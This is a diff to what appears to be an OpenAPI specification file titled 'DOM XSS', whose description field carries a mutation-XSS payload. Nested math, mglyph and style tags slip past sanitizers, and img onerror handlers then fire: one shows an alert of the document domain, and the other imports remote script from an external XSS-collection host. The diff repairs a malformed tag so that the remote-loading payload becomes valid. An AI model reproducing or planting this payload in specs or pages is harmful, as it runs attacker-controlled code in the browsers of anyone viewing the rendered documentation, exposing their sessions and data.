@@ -2,5 +2,5 @@
   info:
     version: 1.0.0
     title: DOM XSS
-    description: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(document.domain)>Img Src=//xss.report/c/no1xjohnwick OnError=import(src)>'
+    description: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(document.domain)><Img Src=//xss.report/c/no1xjohnwick OnError=import(src)>'
   paths: {}
